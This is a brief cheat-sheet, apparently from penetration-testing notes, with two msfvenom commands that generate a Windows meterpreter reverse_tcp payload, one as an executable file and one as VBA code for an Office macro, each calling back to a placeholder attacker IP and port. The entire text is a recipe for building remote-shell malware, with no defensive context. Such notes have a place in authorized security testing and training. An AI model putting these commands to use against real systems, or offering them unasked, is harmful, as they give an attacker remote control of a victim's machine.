## Generating an exe

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o /path/to/payload.exe
```

## Generating a VBA Payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f vba
```


